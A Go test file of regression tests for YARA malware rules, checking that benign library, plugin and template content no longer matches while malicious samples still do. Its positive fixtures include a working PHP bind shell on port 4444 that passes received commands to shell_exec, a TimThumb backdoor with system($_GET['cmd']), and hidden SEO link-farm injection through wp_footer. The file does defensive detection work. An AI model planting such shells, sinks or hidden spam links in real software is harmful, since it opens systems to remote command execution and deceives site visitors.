//go:build yara

package yara

import "testing"

// Regression tests for the 2026-08-07 scheduled-deep-scan false positives.
// The rolling cursor reached stock library, plugin-bundle, and template
// content that these rules over-matched. Each test pins the real legit shape
// that FP'd (negative) and keeps a genuine malicious shape detectable
// (positive). Detection logic is tightened in configs/malware.yar; paths are
// never allowlisted.

// revshell_php_bind graded a JS PHP-function reference and a phpcs.xml rule
// list as a PHP bind shell because socket_bind/socket_listen/shell_exec all
// appear as documented function names. A PHP bind shell is PHP; require the
// open tag.
func TestFPCluster6_RevshellPhpBind_JsFunctionReference(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`window.phpFns={` +
		`socket_bind:["bool socket_bind(resource socket, string address)","Binds a name to a socket"],` +
		`socket_listen:["bool socket_listen(resource socket)","Listens for a connection"],` +
		`shell_exec:["string shell_exec(string cmd)","Execute command via shell and return output"]};`)
	if hasYaraRule(s.ScanBytes(legit), "revshell_php_bind") {
		t.Error("revshell_php_bind FP: matched a JS PHP-function reference table")
	}
}

func TestFPCluster6_RevshellPhpBind_PhpcsXmlRuleList(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<ruleset><rule ref="Generic.PHP.ForbiddenFunctions">` +
		`<element key="socket_bind" value="Avoid using socket_bind()"/>` +
		`<element key="socket_listen" value="Avoid using socket_listen()"/>` +
		`<element key="shell_exec" value="Avoid using shell_exec()"/></rule></ruleset>`)
	if hasYaraRule(s.ScanBytes(legit), "revshell_php_bind") {
		t.Error("revshell_php_bind FP: matched a phpcs.xml forbidden-function list")
	}
}

func TestFPCluster6_RevshellPhpBind_RealBindShellStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<?php
	$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	socket_bind($sock, "0.0.0.0", 4444);
	socket_listen($sock);
	$c = socket_accept($sock);
	$cmd = socket_read($c, 2048);
	socket_write($c, shell_exec($cmd));`)
	if !hasYaraRule(s.ScanBytes(mal), "revshell_php_bind") {
		t.Error("revshell_php_bind regression: real PHP bind shell not detected")
	}
}

// exploit_timthumb matched a hardened, WEBSHOT-disabled TimThumb 2.8.14 (the
// remediated deployment) on the mere presence of the WEBSHOT_ENABLED constant
// and the timthumb function. The exploit is the webshot RCE feature switched
// on, or an injected code-exec sink -- not the library's existence. Unpatched
// clean copies stay covered by the separate version check.
func TestFPCluster6_ExploitTimthumb_HardenedDisabled(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<?php
		if(! defined('WEBSHOT_ENABLED') ) define('WEBSHOT_ENABLED', false);
		class timthumb {
			public static $version = '2.8.14';
			function run() {
				$nullImg = base64_decode("R0lGODlhUAAMAIAAAP8AAP///yH5BAAHAP8ALAAAAABQAAwAAAJ");
				$fp = fopen($this->cachefile, 'rb');
				@fpassthru($fp);
			}
		}`)
	if hasYaraRule(s.ScanBytes(legit), "exploit_timthumb") {
		t.Error("exploit_timthumb FP: matched hardened WEBSHOT-disabled TimThumb 2.8.14")
	}
}

func TestFPCluster6_ExploitTimthumb_WebshotEnabledStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<?php
		define('WEBSHOT_ENABLED', true);
		function timthumb() { /* fetches remote image, webshot RCE reachable */ }`)
	if !hasYaraRule(s.ScanBytes(mal), "exploit_timthumb") {
		t.Error("exploit_timthumb regression: WEBSHOT-enabled TimThumb not detected")
	}
}

func TestFPCluster6_ExploitTimthumb_InjectedSinkStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<?php
		if(! defined('WEBSHOT_ENABLED') ) define('WEBSHOT_ENABLED', false);
		function timthumb() {}
		system($_GET['cmd']);`)
	if !hasYaraRule(s.ScanBytes(mal), "exploit_timthumb") {
		t.Error("exploit_timthumb regression: backdoored TimThumb with injected exec sink not detected")
	}
}

// spam_hidden_links matched a template's hidden social-icon bar whose links are
// href="#" placeholders. SEO link-farm spam packs external http(s) links into
// the hidden container.
func TestFPCluster6_SpamHiddenLinks_HiddenSocialPlaceholders(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<p class="right" style="display:none; visibility:hidden">` +
		`<a href="#" class="socials facebook" title="Facebook">facebook</a>` +
		`<a href="#" class="socials rss" title="Rss">rss</a>` +
		`<a href="#" class="socials twitter" title="Twitter">twitter</a>` +
		`<a href="#" class="socials gplus" title="Google+">google+</a>` +
		`<a href="#" class="socials linkedin" title="LinkedIn">linkedin</a>` +
		`<a href="#" class="socials youtube" title="YouTube">youtube</a>` +
		`<a href="#" class="socials flickr" title="Flickr">flickr</a>` +
		`<a href="#" class="socials pinterest" title="Pinterest">pinterest</a></p>`)
	if hasYaraRule(s.ScanBytes(legit), "spam_hidden_links") {
		t.Error("spam_hidden_links FP: matched a hidden social bar of href=\"#\" placeholders")
	}
}

func TestFPCluster6_SpamHiddenLinks_ExternalLinkFarmStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<div style="display:none">` +
		`<a href="https://casino-x.example/1">buy</a>` +
		`<a href="https://casino-x.example/2">cheap</a>` +
		`<a href="https://pharma.example/3">pills</a>` +
		`<a href="https://loans.example/4">loan</a>` +
		`<a href="https://casino-x.example/5">bet</a>` +
		`<a href="https://casino-x.example/6">slots</a>` +
		`<a href="https://pharma.example/7">viagra</a>` +
		`<a href="https://loans.example/8">payday</a>` +
		`<a href="https://casino-x.example/9">poker</a></div>`)
	if !hasYaraRule(s.ScanBytes(mal), "spam_hidden_links") {
		t.Error("spam_hidden_links regression: hidden external link-farm not detected")
	}
}

// spam_wp_footer_injection matched a plugin that hooks wp_footer and echoes a
// <style> block hiding admin notices, followed by a visible branding link. The
// spam shape hides the injected link itself with an inline style attribute.
func TestFPCluster6_SpamWpFooter_AdminNoticeStyleBlock(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<?php
		add_action('wp_footer', function() {
			echo "<style>.notice:not(.berocket_admin_notice){display:none!important;}</style>
				<header><div class='br_logo_white'>
				<a href='https://berocket.com/plugins/filters' title='BeRocket' target='_blank'>BeRocket</a>
				</div></header>";
		});`)
	if hasYaraRule(s.ScanBytes(legit), "spam_wp_footer_injection") {
		t.Error("spam_wp_footer_injection FP: matched an admin-notice <style> block plus a branding link")
	}
}

func TestFPCluster6_SpamWpFooter_InlineHiddenLinkStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<?php
		add_action('wp_footer', 'inject_links');
		function inject_links() {
			echo '<div style="display:none"><a href="https://spam.example/casino">casino</a></div>';
		}`)
	if !hasYaraRule(s.ScanBytes(mal), "spam_wp_footer_injection") {
		t.Error("spam_wp_footer_injection regression: inline-hidden footer link injector not detected")
	}
}
